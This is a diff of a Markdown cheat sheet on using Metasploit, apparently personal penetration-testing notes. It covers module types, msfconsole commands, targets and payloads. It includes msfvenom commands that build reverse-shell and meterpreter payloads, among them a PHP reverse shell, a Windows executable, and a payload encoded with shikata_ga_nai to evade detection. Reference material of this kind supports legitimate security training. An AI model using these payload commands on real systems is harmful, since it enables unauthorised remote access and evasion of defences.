@@ -3,8 +3,8 @@ layout: default
 ---
 
 targeturi = blog
-# Archi
-/usr/share/metasploit-framework 
+# Architecture
+`/usr/share/metasploit-framework `
 
 # Metasploit
 ```bash
@@ -12,19 +12,21 @@ $ msfconsole -q
 ```
 
 ## Modules
-Type	Description
-Auxiliary	Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.
-Exploits	Defined as modules that exploit a vulnerability that will allow for the payload delivery.
-Post	Wide array of modules to gather information, pivot deeper, etc.
+Metasploit modules are prepared scripts with a specific purpose and corresponding functions that have already been developed and tested in the wild.
 
+| Type       | Description                                                                       |
+|------------|-----------------------------------------------------------------------------------|
+| Auxiliary  | Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality. |
+| Exploits   | Defined as modules that exploit a vulnerability that will allow for the payload delivery. |
+| Post       | Wide array of modules to gather information, pivot deeper, etc.                   |
 
 ```bash
 # Search Module 
 msf6 > search <KEYWORD>
 
-# Use Module
+# Select Module
 msf6 > use <PATH>
-msf6 > use 0
+msf6 > use <NUMBER>
 
 # Show Module Info
 msf6 <TYPE>(<Module>) > info
@@ -33,16 +35,18 @@ msf6 <TYPE>(<Module>) > info
 msf6 <TYPE>(<MODULE>) > show options
 
 # Define option to exploit
-msf6 <TYPE>(<MODULE>) > SET <OPTIONS> <VALUE>
+msf6 <TYPE>(<MODULE>) > set <OPTIONS> <VALUE>
 
 # Run the exploit
-msf6 <TYPE>(<MODULE>) > run
+msf6 <TYPE>(<MODULE>) > run/exploit
 
 # Run as a job
 msf6 <TYPE>(<MODULE>) > run -j 
 ```
 
-## Target
+## Targets
+Targets are unique operating system identifiers taken from the versions of those specific operating systems which adapt the selected exploit module to run on that particular version of the operating system.
+
 ```bash
 msf6 > show targets
 ```
@@ -52,12 +56,13 @@ Payload in Metasploit refers to a module that aids the exploit module in (typica
 
 For example, windows/shell_bind_tcp is a single payload with no stage, whereas windows/shell/bind_tcp consists of a stager (bind_tcp) and a stage (shell).
 
-Start with staged payloads 
-Use non-staged payloads if staged payloads fail.
+- Start with staged payloads 
+- Use non-staged payloads if staged payloads fail.
+
 ```bash
 msf6 > show payloads
 
-msf6 <TYPE>(<MODULE>) > set payload <NUM>
+msf6 <TYPE>(<MODULE>) > set payload <NUMBER>
 ```
 
 ## Enconders
@@ -167,12 +172,7 @@ $ msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 ```
 
 ## Encoder
-### Generating Payload - Without Encoding
-```bash
-$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
-```
-
-### Generating Payload - With Encoding
+### Generating Payload With Encoding
 ```bash
 $ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
 ```
@@ -205,7 +205,7 @@ msf6 <TYPE>(<MODULE>) > grep meterpreter show payloads
 ## Meterpreter Shells
 windows/meterpreter_reverse_https is actually a much more powerful choice because of the encrypted channel, and it allows you to disconnect the payload (and exit msfconsole) without terminating it. And then the payload will automatically get back to you as soon as you set up the handler again.
 
-### Payloads
+### MSFvenom Payloads
 ```bash
 # Staged Payloads for Windows
 $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
